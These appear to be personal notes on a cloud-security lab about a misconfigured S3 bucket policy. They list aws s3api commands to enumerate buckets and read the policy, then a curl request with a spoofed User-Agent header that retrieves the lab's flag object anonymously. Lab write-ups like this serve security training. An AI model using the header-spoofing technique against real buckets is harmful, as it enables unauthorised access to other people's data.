Bucket policies are used to restrict/allow access to buckets and have to be crafted very carefully. A misconfigured bucket policy can allow attackers to steal sensitive data and use the S3 bucket in other attacks.

In this lab, the policies allow anonymous users to read an object by sending a specially crafted request. There exists a misconfiguration in the bucket policy which can be leveraged to identify how the request is to be sent and to read the object.

==================================================================

List s3 buckets --> `aws s3api list-buckets`
Check bucket policy --> `aws s3api get-bucket-policy --bucket s3-special-request-287538029051 --output text | python -m json.tool`
![[Pasted image 20210825204001.png]]

Only a specific user agent is allowed to access the object
Check bucket objects --> `aws s3api list-objects --bucket s3-special-request-287538029051`
Try to access s3 using curl --> `curl http://s3-special-request-287538029051.s3.amazonaws.com`
![[Pasted image 20210825204335.png]]

Use the User-Agent retrieved from bucket policy
`curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (XHTML, like Gecko) Chrome/*" http://s3-special-request-287538029051.s3.amazonaws.com/flag`
Flag retrieved!
